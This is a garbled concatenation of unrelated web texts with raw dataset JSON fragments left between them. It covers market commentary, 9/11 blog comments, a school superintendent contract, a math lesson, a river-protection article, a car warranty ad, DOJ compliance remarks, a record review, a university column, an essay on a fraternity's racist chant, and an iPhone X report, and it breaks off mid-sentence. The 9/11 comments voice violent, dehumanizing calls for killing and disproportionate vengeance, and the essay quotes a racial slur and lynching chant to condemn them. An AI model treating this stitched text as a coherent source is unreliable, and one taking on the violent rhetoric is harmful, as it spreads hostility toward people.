President Trump's Director of the National Economic Council, calling for an \"immediate\" 50-basis-point rate cut.\n\"I am echoing the president's view \u2014 he's not been bashful about that view \u2014 he would also like the Fed to cease shrinking its balance sheet,\" Kudlow told CNBC.\nThis is the same China that just released a manufacturing Purchasing Managers' Index that was at a six-month high.\nOn Wall Street, there is a widespread belief in \"The Fed Put\" \u2014 that the Fed will rescue the economy, if necessary, by decreasing interest rates.\nI believe we've gone beyond the Fed Put. Now, we have the \"Trump Trampoline.\" President Trump wants to use an accommodative Fed to put support under the stock market AND send it higher. Much higher.\nIt's a powerful force that can't be ignored. Sure, there can be pullbacks and corrections. In fact, I expect one sooner than later. But if the market gets in trouble, I expect the Fed to ride to the rescue with all sorts of financial engineering.\nIt's a powerful force we can't ignore. One that could support the markets for quite some time \u2026 until other powerful forces overwhelm it.\nWow! A 7.2% drop in projected Q1 earnings! That looks terrible.\nThis is a weekly chart of the S&P 500. You can see the major index gapped higher this week, and is pushing above recent highs. Those are both bullish in themselves.\nBut there is also a \"Golden Cross.\" That's when the 50-day moving average crosses above the 200-day moving average. This is generally a reliable predictor that the market has room to run to the upside.\nFor investors, this means simply that pullbacks can be bought. President Trump has Wall Street's back. It is a plan that should work very well \u2026 until it doesn't work anymore.\nWHY, and importantly, WHEN this will stop working is another story. And one I'll tell you about in the future. For now, the next time there is a dip, hop aboard the Trump Trampoline.\nWhat about the Dow cycle charts. Thought this April was/is a high?

After the first trade center bombing, our structural engineers concluded that any catastrophe big enough to pull down one of the towers would likely pull them both down. So that idea was out there semi-officially for quite some time.\nAbout a week after the towers fell, we sent a team to the site to help evaluate the integrity of the buildings all around. My boss was part of it; he took the pictures. He's a very stoic, buttoned up Scandihoovian type, but he was clearly very shaken by the things he saw. \"Bodies\" weren't recovered, except for some of the rescue workers who were smothered at the foot of the buildings after the collapse. The \"morgue\" was a series of five-gallon buckets. Workers would put gobbets of meat in the buckets as they picked through the wreckage, then label each bucket and put it under a tarp when it was full.\nDoors and buildings had chalked or spray-painted symbols on the sides, indicating whether and how many airplane parts or body parts had been found (and perhaps were still) inside. Other important evidence was found on rooftops and fire escapes. Everything smoked. Everything stank. People lined the streets up to the police barricades holding bubble-jet pictures of loved ones, hoping those few who had passes to go near Ground Zero would see and recognize someone\u2026something\u2026anything.\nAnd then there are the dreadful stories of looting by\u2026less heroic first responders. There are always those stories after a disaster.\n'ZOMG teh govermint did teh 9/11s!!1!'\nProbably the same who believe in ZOG. As in ZOG.\nThe jumper pics, dear sir, are the worst.\nI try to avoid studying the events of That Day. As worked up as I am, it completely breaks me down. It makes me see a side of me I try very, very, very hard to keep hidden. It frightens me.\nBut I swear upon my life \u2013 if a terrorist were before me, I would slay him with my hands. I know, I know, it's not the right or legal thing, or the Christian thing, but I would rather rot in prison or die at the gallows than let one of those cretin survive.\nNow\u2026I am not as trigger-happy, so to speak (I have no gun), when it comes to Truthers. But in my hierarchy of value assigned to beings, Truthers and others who undermine the West and support Islamism are tolerated only because their parents were human. They, of themselves, have lost all value and consideration in my eyes. If Bach turned out to be a Truther, I would burn all of his CDs that I have.\nWhich is interesting, seeing as I understand why they believe what they believe. But as with Islamism, understanding doesn't solve anything. It just equips us to formulate realistic expectations and to draw up practical proposals. That is, when and where and how to shoot.\nWell, there goes my cover of civility and peaceableness.\nComment from Christopher Taylor\nWhen will the killing end? You should have shouted \"when they stop murdering innocent people in the name of Allah!\"\nComment from nbpundit\nComment from Snapple\nI am still very angry, too.\nComment from Sophist, FCD\nTime: September 17, 2007, 2:18 am\nThis calls for an ugly black cloud of vengeance and death to roll over our enemies \u2014 and anyone unlucky enough to be standing too near our enemies. It calls for wildly and crazily disproportionate response\u2026\nA question? What's the exchange rate for dead Americans? How many random foreign people do we get to murder for, say, one murdered securities trader? And do other countries have the right to murder random foreigners in retaliation too, or is it just us?\nYou people are fucked in the head. There is something that should be there, but isn't, or doesn't function correctly if it is. You're broken.\nI doubt it was ever very convincing anyway.\nHm. FCD. Mister Google, he offers \"Final consent denied\" or \"Fuel Consumption Display\" or \"ferrous conduit distribution\" as possible definitions, but none of those have the right resonance.\nOn the other hand, I'm broken. What do I know?", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 67237}
{"text": "HomeArizona Daily Independent headlinesTUSD offers contract to Sanchez\nTUSD offers contract to Sanchez\nJune 29, 2013 L Hunnicutt\nThe Tucson Unified School District Governing Board has approved a $210,000 annual contract for incoming superintendent H.T. Sanchez. The Board has give Dr. Sanchez until 5 p.m. Saturday to accept the agreement.\nSanchez's compensation package is similar to that offered Elizabeth Fagen, who held the position before John Pedicone.\nAlthough Pedicone had little experience in the top spot at one of Tucson's smallest districts before coming to TUSD, his political connections drew top dollar in negotiations. In August 2012, a District official confirmed that Pedicone's total compensation package of $409,000 was the highest in the State of Arizona. His total potential compensation with a performance bonus was $431,000.\nAccording to Board member Mark Stegeman, Pedicone's contract included $305,400 of guaranteed cash compensation annually, while Dr. Sanchez's contract has $235,000 guaranteed in the first two years and $352,500 guaranteed in the third year.\nPedicone also received 50% more paid leave; nine weeks versus six for Dr. Sanchez. Pedicone received a higher maximum performance bonus and was also allowed to earn consulting income while on paid leave.\nSanchez will have 6 weeks paid vacation, and unlike Pedicone, Sanchez will not be allowed to collect consulting income while on paid leave.\nOn average, the guaranteed annual compensation for Pedicone was over $31,000 higher than for Dr. Sanchez.\nThe Governing Board also voted 4 -1 last night to pay Pedicone $1000 a day to stay on as a consultant, if Sanchez requests his services. They voted 5-0 to pay $500 a day to deputy superintendent Maria Menconi. Menconi has been instrumental in running interference for the District with the Arizona Department of Education and the public in the District's ongoing Mexican American/Multicultural curriculum saga.\nGoverning Board member Michael Hicks said he was pleased with the Board's selection. However he said, \"I continue to struggle with not only the rate of pay that superintendents command, but all the extras that they require.\"\nHeliodoro (H.T.) Sanchez, has served as the interim superintendent of Ector County Independent School District.\nSanchez has worked in public education for 15 years and has been an elementary, middle, and high school principal. He has also served as a district level Bilingual/ESL Services Director and Instructional Support Services Executive Director at Tyler ISD and as Accountability and Special Populations Assistant Superintendent for ECISD.\nOver 60 applicants sought the head position at TUSD, including the District's director of Multicultural Student Services; Auggie Romero.\nWithdrawal of public lands from Multiple Land Use Status threatens our national, economic security\nMurphy under investigation for child molestation\nDave W. says:\nDisband TUSD and send a message to the toad and toadette that their indoctrination methodologies will not be tolerated. The youth deserve a better education and it can be found at any of the adjoining school districts. What is the current wager-line on how soon Mr. Sanchez will realize being a puppet for the Grijalva family is not something you want on your resume?\nColt Cassidy says:\nThe very best to Sanchez, but it's doubtful that anybody or anything (short of a TOTAL miraculous revamp) will ever resurrect TUSD.\nAs long as Adelita Grijalva and other disciples of La Raza and MAS continue to be in the shadows, TUSD will continue to sink ever closer into oblivion.\nI hate to sound cynical but it's like a snow balls chance of surviving on a downtown sidewalk right now. Get kids out if at all possible.\nTom Olson says:\n\"The Governing Board also voted 4 -1 last night to pay Pedicone $1000 a day to stay on as a consultant,\"\nI can't imagine any good coming from continuing to pay Pedicone after he broke a contract he obviously was incapable of fulfilling.\nTired Taxpayer says:\nI certainly hope Dr Sanchez signs this contract and uses this opportunity to demonstrate that Pedicone's experience (2.5 years at a small already highly functioning district-Flowing Wells) and Age are not what TUSD needs. The good old (Grijalva) boys way of doing things didn't work, perhaps a fresh young look will return the District to what it once was, a place of pride.\nNot a place of failure and controversy.\nJon H says:\nAt least Dr Pedicone had experience as a Superintendent. HT Sanchez has no formal experience. He has been an \"Interim Superintendent\" since March of this year.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 19921}

{"text": "Students will be able to explain their multiplicative thinking in the solving of a division problem.\nStudents typically see multiplication and division as two separate operations. This lesson is designed to help them understand their relationship.\nI begin today's lesson with several word problems, asking the students to verbally solve with their partners. I have decided to not have them draw or write these solutions out as a way to \"make\" them use the facts they already know to solve for an unknown.\nJennifer has 4 boxes of pencils. Each box has the same amount of pencils. She has 20 pencils in all. How many pencils are in each box?\nJohn has 15 gumballs. He wants to put them into bags equally. He has 5 bags. How many canhe put into each bag?\nFollowing several problems like these, I give a statement and pose a question.\nBoys and Girls, you have been solving division problems. What are you doing in your minds to find your answers? Are you using something you know?\nKeep talking about this until you are able to have the class understand they are using what they know about multiplication to solve division. I would not go further than that in this conversation. There will be more time to delve into this concept as the unit progresses.\nI like to have prompts printed on labels when they are the main part of the lesson's activity, as it saves time from copying on the board. After I pass out the labels, I ask the students to work on their own at first to show their solution to the question. I tell them all of the information is there and the math facts are complete already. Their task is to show/explain why it is true. I also have cubes available for them to model their thinking before writing.\nAs students work, I watch to see if they are using equal groups naturally and discussing multiplication as they draw or write their thinking. My goal is to just have the students work with factors in a division problem and practice communication skills around this concept of multiplication and division being related. They need to have the vocabulary in order for us to dig into their thinking and into deeper concepts.\nThis student starts out telling me there are all sorts of ways to solve, but really wasn't giving me any detailed thinking. With a few small prompts, she can focus her thinking and use some vocabulary to help explain her work.\nWhen I speak with this student, I am really impressed with how he organizes his work, as we have done so much with arrays in the past. When I ask him why he uses an array, he was at a loss for words. Again, sometimes the routine students get into are so habitual, they can't explain why they are the best strategy. Common Core expects this metacognition to occur and I believe it is necessary for deep understanding. Listen to the prompts I use with him.\nTo wrap up this lesson, I suggest you pair students who used different strategies to share with each other. My students are working on agreeing and disagreeing with the math, not the person. You may even have the students rotate to several journals. Then pull everyone together and share a few \"chosen\" responses on the board. These would be the ones that most point toward the lesson of the day, which is \"multiplication can be used to solve division\".", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 73989}

A dam that would have blocked the river here is now off the books after an aggressive challenge by Pitkin County.\nGLENWOOD SPRINGS \u2013 The Colorado River District is the first governmental entity to throw cold water on the idea of designating 39 miles of the Crystal River as \"wild and scenic.\"\nAt its July 15 meeting, three members of the river district board voiced opposition to the proposal to make the Crystal the second river in Colorado, after the Poudre River, to be designated under the Wild and Scenic River Act of 1968.\n\"Their main concern is that it would be an overlay of federal authority in this area that would preclude the ability to provide for water resource needs,\" said Dave Merritt, who represents Garfield County on the board of the river district, a regional entity that levies taxes in 15 Western Slope counties to build water projects and influence water policy.\nChris Treese, the river district's external affairs manager, had urged board members in a July 1 memo to \"respectfully decline to support\" Wild and Scenic designation on the Crystal.\n\"Staff believes Wild and Scenic designation would have adverse consequences for local residents,\" Treese wrote. \"We view proponents' Wild and Scenic designation is (sic) a means to an end in an effort to forever foreclose water development opportunities in the Crystal River basin.\"\nIn 2013, the river district gave up conditional water rights it held for two large dams on the Crystal after being sued in water court by Pitkin County and other groups.\nMerritt made his remarks on Monday during the monthly meeting of the Colorado River Basin Roundtable, where two proponents of Wild and Scenic designation on the Crystal \u2014 Bill Jochems and Dorothea Farris \u2014 had a presentation.\nOver the last year-and-a-half of making such presentations, they said they had received positive feedback and direction to continue exploring Wild and Scenic designation from the towns of Carbondale and Marble, the Redstone Community Association, Gunnison County, Pitkin County's Healthy Rivers and Streams board and Pitkin County's Crystal River Caucus.\nBut the Colorado River District will not be added to the list of supporters.\n\"That was the one audience where we had definite opposition,\" Farris said on Monday.\nJochems said the three river district board members who spoke against Wild and Scenic on July 15 \"expressed opposition, apparently, at the very idea of Wild and Scenic designation, without really talking about the Crystal.\"\nOn Monday, roundtable members asked some questions concerning the potential impact on irrigators in the Crystal River, but did not take a position as a group on the proposal.\nJochems and Farris represent an informal citizen's coalition that has come together to explore, and now actively pursue, Wild and Scenic designation for the Crystal, which would prevent a federal agency from approving, or funding, a new dam or reservoir on the river.\nIn late 2012, four organizations brought people together to discuss the idea: Pitkin County, the Roaring Fork Conservancy, the Crystal Valley Environmental Protection Association (CVEPA) and the nonprofit, American Rivers.\nThe result was the naming of a three-person committee to test the regional waters and see if there was support for the idea.\nJochems serves on Pitkin County's Healthy Rivers and Streams board and is a member of CVEPA, while Farris is a former Pitkin County commissioner and a resident of the Crystal River valley. The third member on the committee is Chuck Oligby, who owns Avalanche Ranch along the Crystal and sits on the Colorado River Basin Roundtable.\n\"We want to move forward,\" Farris told the roundtable on Monday.\nBrent Gardner-Smith/Aspen Journalism\nThe Crystal River valley is especially scenic in Crystal.\nThree reaches\nThe current proposal is to designate 39 miles of the Crystal River as Wild and Scenic, while more specifically designating three sections as either \"wild,\" \"scenic\" or \"recreational.\"\nThe three designations are not literal, as all of the Crystal could be considered \"scenic\" by anyone who sees it, but are classifications that reflect the level of human incursion along a river.\nThe headwaters of both the North Fork and the South Fork of the Crystal would be designated as \"wild\" under the law, as they flow through primitive backcountry areas with few, if any, roads. The North Fork, for example, first rises behind the Maroon Bells in the Snowmass-Maroon Bells Wilderness.\nTogether, about nine miles of the two upper forks would be managed as \"wild\" down to their confluence in Crystal City, above Marble.\nThe next 10 miles of the Crystal, down to Beaver Lake in Marble, would be considered \"scenic,\" as there is a dirt road along the river in that reach.\nAnd the next 20 miles, between Marble and the Sweet Jessup Canal diversion structure, 10 miles above the river's confluence with the Roaring Fork River, would be considered \"recreational,\" due in large part to the paved road along the river.\n\"What we're seeking here is a very stripped down version of a Wild and Scenic designation,\" Jochems told the roundtable on Monday. \"We propose to leave land-use control entirely with Gunnison and Pitkin counties, as it is now. We don't propose any further federal control over land use. We don't want features that would allow any condemnation of property. All we're concerned about is the main stem of the Crystal River and keeping it free of dams.\"\nMerritt of the river district, however, pointed out that national environmental groups have opposed \"stripped-down\" versions of Wild and Scenic in the past, as they are concerned about weakening the federal law.\nThe U.S. Forest Service first found the Crystal River as \"eligible\" for Wild and Scenic status in the 1980s and re-affirmed that finding in 2002. Much of the land along the Crystal, from the headwaters to the Sweet Jessup head gate, is owned by the Forest Service.\nThe next step in the Wild and Scenic process is for a river to be determined \"suitable\" by the Forest Service, which requires an extensive study under the National Environmental Policy Act (NEPA), and then congressional action.\nAnother option is for legislation to be submitted directly to Congress, which could then potentially approve Wild and Scenic designation after a less formal study.\nJochems said Wednesday, in an interview, that the three-member committee seeking designation has been meeting with Kay Hopkins, an outdoor recreation planner with the Forest Service, to seek guidance on draft legislation.\nThe draft bill, Jochems said, is then to be circulated among the towns, counties and other entities that have expressed an opinion so far, and see what details need to be worked out. If legislation can be agreed upon by local entities, a congressional sponsor would then be sought, Jochems said.\nEditor's note: Aspen Journalism is collaborating with the Aspen Daily News on coverage of land and water issues in Pitkin County.

But what happens when that warranty period is over? What if you could have that same coverage for even longer?\nThat's where the new Chevrolet, Buick, GMC and Cadillac optional Extended Limited Warranty comes in.* Available exclusively for new GM vehicles, it includes everything the manufacturer's standard bumper-to-bumper limited warranty covers \u2014 but for longer. And, the Extended Limited Warranty is provided directly by General Motors, so you can feel confident you're covered by a company you trust.\nWhen you purchase a new GM vehicle, you automatically receive the standard manufacturer's bumper-to-bumper limited warranty. But now you have the option to choose a longer coverage with the Extended Limited Warranty.\nBumper-to-Bumper Limited Warranty\n(whichever comes first)\n36 months/36k miles\nIt's important to note that the Extended Limited Warranty is not the same as a Protection Plan (also known as an Extended Vehicle Service Contract). Protection Plans, which have been offered in the marketplace for years, provide coverage for failure of certain parts. The new Extended Limited Warranty, however, provides full bumper-to-bumper coverage, including items not always covered by a Protection Plan.\nYou typically have the option to get a Protection Plan either at the time of vehicle purchase or some time later during your ownership journey (subject to mileage restrictions). The Extended Limited Warranty, however, is only available at the time you purchase your new Chevrolet, Buick, GMC or Cadillac vehicle. Ask your dealer how you can enjoy the peace of mind that comes with having a longer warranty coverage on your new vehicle. Your wallet will thank you.\n*The Extended Limited Warranty is not available on vehicles sold in California, Florida, Hawaii, Maine, Minnesota or Missouri.\nBy Lori Tutt, GM Financial\nFrom cars and movies to great works of literature, Lori Tutt has a passion for the classics.

Through the film we catch a glimpse into what he was thinking and feeling at the time and what moved him to take up the cause of abolition. But it is about more than a moment in history \u2013 as it raised again the question of what we will do to address the abiding presence of slavery in our contemporary world.\nThe film is not just a reminder of things past but a call to respond to the present.

{"text": "Principal Deputy Associate Attorney General Discusses DOJ's Corporate Enforcement Priorities, Focus on Corporate Compliance\nJaime L.M. Jones and Whitney Nebolisa\nCompliance, Enforcement, FCA Liability, Knowledge/Scienter\nAt the recent Compliance Week Annual Conference, Principal Deputy Associate Attorney General Claire McCusker Murray delivered extensive remarks on DOJ's corporate enforcement priorities. Of particular note, Murray discussed a number of policy reforms focused on promoting and incentivizing corporate compliance and cooperation.\nWith respect to the Department's affirmative corporate enforcement priorities, Murray highlighted recent policy reform that promotes and incentivizes cooperation in civil and criminal actions. In the criminal context, she acknowledged the expansion of the Corporate Enforcement Policy, which now extends cooperation credit to defendants in FCPA cases and criminal enforcement actions. Murray also announced the False Claims Act cooperation policy, which awards cooperation credit to companies for \"voluntarily disclosing misconduct, cooperating in an ongoing internal investigation or undertaking remedial measures such as implementing or improving compliance programs.\" This cooperation credit, which was previously reported on here, can be demonstrated in a number of forms, including disclosures outside the scope of a current government investigation or corrective actions taken in response to the FCA violations.\nOf particular interest to companies potentially facing FCA investigations or litigation is the FCA Cooperation Policy's impact on DOJ enforcement actions. Murray announced that the new policy allows the government to \"take into account the nature and effectiveness of the company's compliance program\" as evidence of intent in the government's assessment of FCA liability. Stated differently, the presence of a robust compliance program, at the time of the conduct at issue, could demonstrate a lack of scienter or otherwise be a strong mitigating factor in the government's assessment of FCA liability. She cautioned, however, that this policy does not create a \"compliance defense,\" nor does it award credit to \"fig-leaf\" compliance systems used by companies to circumvent or ignore potential fraud complaints. Nevertheless, this is a significant development for prospective defendants, as this could result in less risk of FCA liability where the company has made concerted, good-faith efforts to identify and address potential issues through its compliance program and policies.\nMurray also underscored the Department's efforts to curb the overuse and enforcement of subregulatory guidance in both civil actions and criminal prosecutions by refraining from \"treating a party's noncompliance with subregulatory guidance as itself a violation of applicable statutes or regulations.\" Murray's remarks are consistent with the Brand Memo, now codified in the Justice Manual, prohibiting \"Department components from issuing guidance documents that effectively bind the public without undergoing the notice-and-comment rulemaking process\" (previously reported on here and here). To further clarify these announcements, Murray offered guidance on the applicability of subregulatory guidance for corporate compliance, noting that compliance officers should complete \"good-faith risk calculations\" when determining whether to adhere to subregulatory guidance, or whether it is more effective to follow another lawful approach.\nTo underscore the Department's commitment to promoting corporate compliance, Murray announced the Civil and Criminal Division's new recruiting and training initiatives, which are aimed at hiring government lawyers with in-house compliance experience and educating government lawyers on effective compliance programs. It is Murray's hope that the Department, armed with corporate compliance proficiency, will be able to fully assess the effectiveness of corporate compliance programs at the time of the conduct at issue.\nThe prepared remarks are available here.\nWhitney Nebolisa\nwnebolisa@sidley.com\nhttps://fcablog.sidley.com/wp-content/uploads/sites/5/2022/08/sidleyLogo-e1643922598198.png 0 0 Jaime L.M.

Burr, 551 U.S. 47 (2007). Under Safeco, courts ask whether a defendant's interpretation of the ambiguous law or regulation at issue was objectively reasonable and whether authoritative guidance might have warned the defendant away from that interpretation.

The survey of 223 chief information officers, chief technology officers, chief security officers and chief compliance officers at healthcare providers and health plans also found that 13 percent of respondents said they're targeted by external hack attempts about once a day, and another 12 percent are seeing about two or more such attacks a week.\"\n\u2013 eSecurity Planet\n\"The extortion group known as DD4BC has stepped up the number of attacks this year and is now targeting the financial services industry, according to a new report. [\u2026] the report, has identified 114 attacks carried out by DD4BC since April 2015.\"\n\u2013 Coin Desk\nLegal and Regulations\nAccording to the Secretary of Defense, \"urgent and compelling\" reasons led to the introduction of new rules regarding incident reporting by Department of Defense (DoD) contractors, as well as security standards for cloud service providers. The interim rules are putting into effect sections of the National Defense Authorization Act for Fiscal Years 2013 and 2015, and were announced without prior opportunity for public comments. The DoD will consider public comments \u2013 which have to be submitted on or before Oct. 26 \u2013 before issuing the final rule.\n\u2013 Lexology\n\"Databases used to storage electronic medical records are prone to information leakage despite being encrypted, according to research from Microsoft.

The dropped charges come as the Federal Bureau of Investigation and the Obama administration have been ramping up efforts to counter what they say is a growing problem of economic espionage directed at U.S. companies by Chinese firms.\"\n\u2013 Wall Street Journal\n\"Stung by recent court decisions that have gone against them, Justice Department lawyers are pushing to clarify a computer trespass law that critics malign as overly broad.

{"text": "Home \u00bb review \u00bb EP Review: Riverside \u2013 Memories in My Head\nPosted in review By Bill Kopp On June 24, 2011\nEP Review: Riverside \u2013 Memories in My Head\nHaving come of age in the vinyl era, some of my media/format definitions don't quite match up with their modern usage. An LP was a \"long player\" and usually ran somewhere between 28 and 38 minutes, divided between two sides. An EP (extended play) was a single with a couple of extra tracks. And \u2013 this may confuse younger readers \u2013 a \"single\" had two songs, one on each side.\nUnless you were Todd Rundgren, you didn't feel the need or inclination to pack an album full of more than those thirty-eight minutes or so. In fact there was a down-side to doing so: more music meant the grooves were packed closer together, reducing the record's volume. Hence Todd's liner notes exhortations to turn it up.\nThat all changed with the advent of CDs. I recall Dire Straits' Brothers in Arms LP (I was working for a record store in those days). The album was issued in three formats: vinyl, cassette and CD. As a means of enticing consumers to the glorious new digital format, the CD version included longer versions of some of the songs. Longer, yes. Better? Not so much.\nMy point, finally \u2013 and it's a crushingly obvious one \u2014 is that more is not necessarily better. Quality wins over quantity every time. A good reminder of this axiom is the new, er, EP from Riverside, Memories in My Head. Made up of three tracks extending across some thirty-three minutes, the disc is nominally an EP. But in terms of quality, it's an album.\nThese days, the Polish quartet Riverside is often thought of as prog-metal; of late their music has leaned toward Fear of a Blank Planet era Porcupine Tree, with atmospheric keyboards, kinetic drumming and metallic guitar riffage. But it was not always so: the group's earlier efforts placed more emphasis on a flowing midtempo melodicism, taking a page from pre-Dark Side of the Moon Pink Floyd.\nAnd it is to that aesthetic that Riverside returns on Memories in My Head. Recorded and released to commemorate the band's ten-year anniversary, the EP intentionally revives their earlier sound. That's clear even before removing the shrinkwrap: the title connects to the group's 2005 EP Voices in My Head.\nThe trip backwards isn't so surprising in light of recent history. Mariusz Duda (leader/bassist/vocalist/lyricist) has been moving in a more melodic, atmospheric direction on his pair of Lunatic Soul albums.\nThe chugging, pulsating opening of \"Goodbye Sweet Innocence\" calls to mind Pink Floyd's \"Welcome to the Machine.\" But where (on the band's recent albums) the tune might have exploded into a frenzy after the extended intro, here it unfolds into a dreamy throb, full of Alan Parsons Project-styled synth arpeggios courtesy of Michal Lapaj. When the guitar and vocal come in, Duda sings in a quiet, plaintive manner. Piotr Grudzinski's soaring guitar lines owe more to David Gilmour than any more modern metallurgists. Piotr Kozieradzki's drum work adds a modern spin to the music, sounds as it does influenced by the work of Gavin Harrison.\n\"Living in the Past\" (no, not the Jethro Tull classic) is an example of what Duda calls \"spacious, soundtrackish, nostalgic\" music. Again, it's extremely melodic stuff, free from modern metal influence. In fact in places it sounds more like Kansas or King Crimson. It too is long, moving through different movements (a bit like some of the suites on Porcupine Tree's The Incident, but the music never meanders, never fails to compel.\nThe third and final track on Memories in My Head continues the record's theme of passing time. \"Forgotten Land\" is built initially around a bass riff and Duda's vocal. The two initially seem to have little do with one another, but the other instruments come in and tie everything together nicely. The song stays just this side of melodrama in its arrangement, eventually drifting off into some chorus vocals (shades of 10cc?) and gurgling mid-70s synth.\nWith mainstream progressive music this good, there's simply no good reason to put any more of it on an album than Riverside serves up on Memories in My Head.\nDISCLOSURE OF MATERIAL CONNECTION:", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 42560}
{"text": "In this, my last column for Chico Statements, I want to circle back to some of the first understandings that I brought with me to Chico State when I was announced as the University's president in November 2003. These notions have guided my work ever since. To be sure, not perfectly and not to everyone's satisfaction. But I've always kept them in mind. Always recognized that just as action without understanding has no meaning, understanding without action has no consequence.\nIt is also a place where a certain moral code, certain \"right rules of conduct\" must prevail in order to accomplish the balance between freedom and responsibility that enables us to succeed as the place Aquinas described. At the heart of this code are reason and respect, civility and community.\nAs we embrace them, we not only find delight in the company of the people and ideas that make a university vibrant and vital, but we recognize that we teach our students as much through the knowledge we dispense as the example we provide.\nFirst, we have a responsibility as a place of public purpose and service to serve and improve our local, regional, national, and global communities. Yes, we do this through research, curricula, and outreach programs, but especially through preparing students with the attitudes, skills, and habits to participate in our democracy and become useful, contributing members of their communities. Indeed, a principal way in which we serve the public good is equipping our students not only with what it takes to make a good living, but also with what it means to lead a good life. That is, lives of service, meaning, and consequence.\nSecond, we both shape and welcome high expectations for our work. High performance is a consequence of high expectations. Moreover, we translate high expectations into the way we serve others\u2014most notably and importantly, our students. In a profound way, we prepare our students to go confidently in the pursuit of their own dreams, and we urge them to enable others to have theirs.\nThis is one of the most powerful ways that makes teaching the wonderful human experience it is. It is the chance we are offered as teachers to give something of ourselves to our students, and, as if it were a spark of light, our students will pass it on to their students\u2014and on and on. The human experience is uniquely defined by hopes and dreams, and we have that joy\u2014and responsibility\u2014every day to change the world for the better by fostering hope and encouraging dreams.\nSo, it is particularly gratifying that my final issue of Chico Statements focuses on some of our faculty, staff, students, and alums who are making the world a better place. This issue's features include CAVE's 50th anniversary; a story on Girls on The Run, a physical-activity-based education program for girls in the third through fifth grades; profiles on three alumni who are advancing legislation and policy to address gun violence, protect transgender rights, and mandate epiPens in K-12 schools statewide; and highlights of our 2016 Distinguished Alumni.\nYou will surely be impressed with the people whom these stories feature. And proud of the University that claims them as its own. These are the people and the stories that underscore why I have anticipated getting to the campus every day for 13 years, because I knew something special, something reaffirming, was always possible that day. It is what I will miss most\u2014and what I will remember most gratefully. Wildcat for life!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 35185}

{"text": "There Will Never Be a Genius in the SAE\nWARNING: There is a certain ugly term that society has universally decided can no longer be quoted in print and must be bleeped from sound recordings. The term is commonly referred to now as \"The N-word.\" I am going to use that word in this little essay. If you feel your head will explode from seeing the word, you should stop reading right here.\nA few days ago a busload of fraternity boys from Sigma Alpha Epsilon at the University of Oklahoma were recorded singing a song to the tune of \"If You're Happy and You Know It,\" with new lyrics. It went like this:\nThere will never be a nigger in the SAE!\nYou can hang him from a tree\nBut he'll never sign with me!\nI'm sorry to say that it did not shock me to find that there is such consensual racism in a fraternity. I mean, it sounded like the whole bus was singing along. What did shock me, a little, was the stupidity. It was one of those \"What were they thinking?\" moments.\nAs it happened, there were at least two white boys on that bus who were recording the moment on their ubiquitous cell phones. A black student group obtained the videos, and posted them for all to see.\nWhat I want to know is \u2026 how? I doubt the guys sent the videos to the student group because they thought black people might be amused by them. No one has yet told me how the videos got out there, but I have a good guess, and I'll bet you do, too. Those two geniuses must have posted them on the Internet.\nFacebook, YouTube, Reddit, Imgur, any of a dozen possible sources that you would think, by now, even the least tech-savvy social networker in cyberspace (like myself) would realize puts it out there for all the world to see. But people keep doing it, don't they? Self-incrimination.\nSo far only two of this lynch-happy glee club have come forward, probably because their faces were easily identifiable in the videos. One of them, Parker Rice, 19, says the song was taught to him by other members. He also says:\n\"I am deeply sorry for what I did \u2026\"\n\"It was wrong and reckless \u2026\" Blah blah blah.\nThe other, Levi Pettit, let his parents speak for him:\n\" \u2026 shocked and saddened \u2026\"\n\"He made a horrible mistake \u2026\" Blah blah blah.\nI would have thought that maybe one or two others on the bus might have come forward by now with a plea something like this:\n\"I was there on the bus and heard the racist song, but I didn't sing it. I thought about coming forward and telling the others how wrong it was, but I did not, and I am deeply ashamed \u2026\" Blah blah blah. But no one has.\nMusing further, I wondered \u2026 could there be some other explanation for that song? Something that didn't involve racism? Any defense lawyer will tell you that there is always another side to every story, all you have to do is look for it, or make one up and sell it to a jury. Thus did Dan White get off easy for assassinating Harvey Milk and George Moscone because he ate too many Twinkies. Thus did O.J. Simpson get off completely for butchering Nicole Brown Simpson and Ronald Goldman because a fucking glove didn't easily fit.\nSo I thought and thought, just as a mental exercise, you understand, to see if I could come up with a way to exonerate these future-KKK assholes. And I came up with an excuse they could try out.\nThey were re-enactors.\nI guess you know that, most weekends back East, hordes of fat guys go out into the woods on or near a battlefield of the War Between the States (or as we called it in Texas, the War of Northern Aggression) and drag their tents out of their Super-Duty extended cab pick-ups. Then they dress up in Union or Confederate uniforms and blaze away at each other, pretending that charging into a battery of cannons firing chain shot was a lot of fun.\nThis bus trip was like that. These guys were re-enacting the civil rights struggle of the 1960s. This happens to be the 50th anniversary of the police riot in Selma, Alabama. These guys had intended to go to Selma and pretend to be the racist white folks who watched the cops break heads and chanted \"Niggers go home!\" Then they planned to move on to the University of Alabama. They had a George Wallace impersonator ready to stand in the doorway of the auditorium and prevent two black students from entering. That is where they planned to sing their little racist ditty. I mean, you can't have a re-enactment with just one side showing up. You have to have the Johnny Rebs out there on the battlefield with the Union troops. So, in conclusion, ladies and gentlemen of the jury, I submit that this was all a misunderstanding.\nYou think it will fly?

{"text": "News | Technology |\nThe company let suppliers reduce accuracy of the phone's Face ID system to speed up production.\nInside Apple's Struggle to Get the iPhone X to Market on Time\nEghtesadOnline: As of early fall, it was clearer than ever that production problems meant Apple Inc. wouldn't have enough iPhone Xs in time for the holidays. The challenge was how to make the sophisticated phone\u2014with advanced features such as facial recognition\u2014in large enough numbers.\nAs Wall Street analysts and fan blogs watched for signs that the company would stumble, Apple came up with a solution: It quietly told suppliers they could reduce the accuracy of the face-recognition technology to make it easier to manufacture, according to people familiar with the situation.\nWith the iPhone X set to debut on Nov. 3, we're about to find out whether the move has paid off. Some analysts say there may still be too few iPhone Xs to meet initial demand. Ming-Chi Kuo of KGI Securities predicts Apple will have two to three million handsets available on launch day and 25 million to 30 million units for the holiday quarter, down from his previous forecast of 40 million. For comparison, Apple sold 78 million phones during the same period last year, although that included all models, Bloomberg reported.\nApple is famously demanding, leaning on suppliers and contract manufacturers to help it make technological leaps and retain a competitive edge. The company's decision to downgrade the accuracy of its Face ID system\u2014if only a little\u2014shows how hard it's becoming to create cutting-edge features that consumers are hungry to try. And while Apple has endured delays and supply constraints in the past, those typically have been restricted to certain iPhone colors or less important offerings such as the Apple Watch. This time the production hurdles affected a 10th-anniversary phone expected to generate much of the company's revenue. Apple declined to comment.\nAbout a month 